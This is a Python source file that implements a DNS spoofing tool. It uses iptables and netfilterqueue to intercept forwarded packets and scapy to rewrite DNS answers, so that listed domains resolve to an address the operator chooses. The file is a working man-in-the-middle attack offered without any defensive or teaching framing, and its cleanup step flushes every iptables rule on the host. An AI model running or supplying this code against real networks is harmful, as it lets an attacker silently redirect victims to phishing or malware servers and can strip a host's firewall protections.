import netfilterqueue
import scapy.all as scapy
import subprocess


class DNSSpoofer:
    def __init__(self, redirect_from, redirect_to):
        self.redirect_from = redirect_from
        self.redirect_to = redirect_to
        self.queue = netfilterqueue.NetfilterQueue()

    def process_packet(self, packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.DNSRR):
            qname = scapy_packet[scapy.DNSQR].qname
            for link in self.redirect_from:
                if bytes(link, encoding="utf-8") in qname:
                    answer = scapy.DNSRR(rrname=qname, rdata=self.redirect_to)
                    scapy_packet[scapy.DNS].an = answer
                    scapy_packet[scapy.DNS].ancount = 1

                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.UDP].chksum
                    del scapy_packet[scapy.UDP].len

                    packet.set_payload(bytes(scapy_packet))
        packet.accept()

    def spoof_dns(self):
        subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
        self.queue.bind(0, self.process_packet)
        self.queue.run()

    def stop_spoofing_dns(self):
        self.queue.unbind()
        subprocess.call("iptables --flush", shell=True)